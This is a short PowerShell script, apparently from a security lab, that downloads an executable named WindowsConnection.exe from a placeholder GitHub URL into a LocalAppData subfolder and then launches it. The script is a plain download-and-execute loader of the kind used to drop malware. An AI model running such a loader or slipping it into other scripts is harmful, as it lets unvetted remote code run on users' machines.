
$downloadUrl = "https://raw.githubusercontent.com/yourorg/safe-lab/main/WindowsConnection.exe"
$targetPath = "$env:LOCALAPPDATA\ResearchLab\Storage\WindowsConnection.exe"
Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath
Start-Process -FilePath $targetPath
